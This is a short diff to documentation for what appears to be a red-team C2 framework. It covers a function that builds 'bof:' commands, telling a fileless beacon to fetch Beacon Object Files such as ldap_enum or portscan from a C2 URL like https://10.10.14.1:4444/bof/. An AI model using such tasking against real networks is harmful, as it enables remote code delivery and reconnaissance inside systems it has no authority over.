@@ -399,10 +399,10 @@ point as the argument buffer, so arguments are joined with commas.
 | `bof_name` | `str` |  | BOF catalog name (e.g., ``ldap_enum``). |
 | `c2_url` | `str` |  | C2 base URL (e.g., ``https://10.10.14.1:4444``). |
 | `args` | `list[str] \| None` | `None` | Optional arguments to pass to the BOF as one comma-joined string. |
-| `bofs_dir` | `str` | `_BOFS_URL_SEGMENT` | URL segment under ``/download/`` that serves the BOF. |
+| `bofs_dir` | `str` | `_BOFS_URL_SEGMENT` | URL segment serving the BOF (default ``bof``, the raw base64 route the fileless beacon consumes). |
 
-**Returns:** `str` - A command string like ``bof:https://10.10.14.1:4444/download/bofs/ldap_enum``
-or ``bof:.../bofs/portscan 10.0.0.7,80,110`` when args are given.
+**Returns:** `str` - A command string like ``bof:https://10.10.14.1:4444/bof/ldap_enum``
+or ``bof:.../bof/portscan 10.0.0.7,80,110`` when args are given.
 
 **Raises**
 
